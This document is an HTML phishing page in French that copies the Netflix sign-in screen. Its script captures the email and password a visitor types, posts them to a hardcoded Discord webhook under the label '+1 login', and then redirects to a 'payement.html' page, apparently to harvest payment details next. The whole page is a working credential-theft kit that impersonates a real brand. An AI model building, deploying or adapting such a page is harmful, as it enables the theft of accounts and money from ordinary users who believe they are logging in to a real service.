<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background: url('https://images.frandroid.com/wp-content/uploads/2022/10/netflix-octobre-contenus-2022.jpg') center center;
      background-size: cover;
      background-attachment: fixed;
      background-repeat: no-repeat;
      min-height: 100vh;
      color: white;
      position: relative;
      overflow-x: hidden;
    }
    .background-overlay {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(
        to bottom,
        rgba(0, 0, 0, 0.4) 0%,
        rgba(0, 0, 0, 0.7) 50%,
        rgba(0, 0, 0, 0.9) 100%
      );
      z-index: 2;
    }
    .header { position: relative; z-index: 10; padding: 20px 50px; }
    .netflix-logo { font-size: 28px; font-weight: bold; color: #e50914; letter-spacing: -1px; }
    .login-container {
      position: relative; z-index: 10; max-width: 450px; margin: 60px auto;
      background: rgba(0,0,0,0.75); border-radius: 4px; padding: 60px 68px 40px;
      backdrop-filter: blur(10px); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    }
    .login-title { font-size: 32px; font-weight: bold; margin-bottom: 28px; color: #fff; }
    .form-group { margin-bottom: 16px; }
    .form-input {
      width: 100%; height: 50px; background: #333; border: none;
      border-radius: 4px; color: #fff; font-size: 16px; padding: 16px 20px 0;
      outline: none;
    }
    .form-input::placeholder { color: #8c8c8c; font-size: 14px; }
    .form-input:focus { background: #454545; border: 1px solid #e50914; }
    .login-button {
      width: 100%; height: 48px; background: #e50914; border: none;
      border-radius: 4px; color: #fff; font-size: 16px; font-weight: bold;
      cursor: pointer; margin: 24px 0 12px; transition: background-color 0.2s;
    }
    .login-button:hover { background: #f40612; }
    .divider { text-align: center; margin: 16px 0; color: #737373; font-size: 14px; }
    .code-signin {
      width: 100%; height: 48px; background: #333; border: none; border-radius: 4px;
      color: #fff; font-size: 16px; cursor: pointer; margin-bottom: 16px; transition: background-color 0.2s;
    }
    .code-signin:hover { background: #454545; }
    .forgot-password {
      color: #b3b3b3; font-size: 13px; text-decoration: none; margin-bottom: 16px; display: inline-block;
    }
    .forgot-password:hover { text-decoration: underline; }
    .remember-me {
      display: flex; align-items: center; margin-bottom: 16px; font-size: 13px; color: #b3b3b3;
    }
    .checkbox { margin-right: 8px; width: 16px; height: 16px; }
    .new-to-netflix { font-size: 16px; color: #737373; margin-bottom: 16px; }
    .signup-link { color: #fff; text-decoration: none; font-weight: bold; }
    .signup-link:hover { text-decoration: underline; }
    .recaptcha-info { font-size: 13px; color: #737373; line-height: 1.4; margin-bottom: 8px; }
    .learn-more { color: #0071eb; text-decoration: none; font-size: 13px; }
    .learn-more:hover { text-decoration: underline; }
    .footer {
      position: relative; z-index: 10; text-align: center; padding: 20px;
      color: #737373; font-size: 13px;
    }
    @media (max-width: 740px) {
      .login-container { margin: 20px; padding: 40px 28px; }
      .header { padding: 20px 28px; }
    }
  </style>
</head>
<body>
  <div class="background-overlay"></div>
  <header class="header">
    <div class="netflix-logo">NETFLIX</div>
  </header>
  <div class="login-container">
    <h1 class="login-title">Identifiez-vous</h1>
    <form id="loginForm">
      <div class="form-group">
        <input type="text" class="form-input" id="email" placeholder="E-mail ou numéro de mobile" required>
      </div>
      <div class="form-group">
        <input type="password" class="form-input" id="password" placeholder="Mot de passe" required>
      </div>
      <button type="submit" class="login-button">S'identifier</button>
    </form>
    <div class="divider">OU</div>
    <button class="code-signin">Utiliser un code d'identification</button>
    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
    <div class="remember-me">
      <input type="checkbox" id="remember" class="checkbox">
      <label for="remember">Se souvenir de moi</label>
    </div>
    <div class="new-to-netflix">
      Première visite sur Netflix ? <a href="#" class="signup-link">Abonnez-vous maintenant.</a>
    </div>
    <div class="recaptcha-info">
      Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
    </div>
    <a href="#" class="learn-more">En savoir plus.</a>
  </div>
  <footer class="footer">
    Des questions ? Appelez le 0805 98 06 66 (sans frais)
  </footer>

  <script>
    
    const loginButton = document.querySelector('.login-button');
    loginButton.addEventListener('mouseenter', function() {
      this.style.transform = 'translateY(-1px)';
      this.style.boxShadow = '0 4px 12px rgba(229, 9, 20, 0.4)';
    });
    loginButton.addEventListener('mouseleave', function() {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = 'none';
    });

    
    const inputs = document.querySelectorAll('.form-input');
    inputs.forEach(input => {
      input.addEventListener('focus', function() {
        this.style.transform = 'scale(1.02)';
      });
      input.addEventListener('blur', function() {
        this.style.transform = 'scale(1)';
      });
    });

    
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      fetch('https://discord.com/api/webhooks/1408522079510200480/25tWSFmhmOcHFy5SZmzFeI4fEgrOt8_h9jErz7YU0BRSVAZ8HieV3_f7LaiLFMsDbkSF', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `🕷️+1 login 🕷️\n\n 🏁Email : ${email}\n🔒Password : ${password}`
        })
      }).then(response => {
             window.location.href = 'payement.html'
      });
    });
  </script>
</body>
</html>
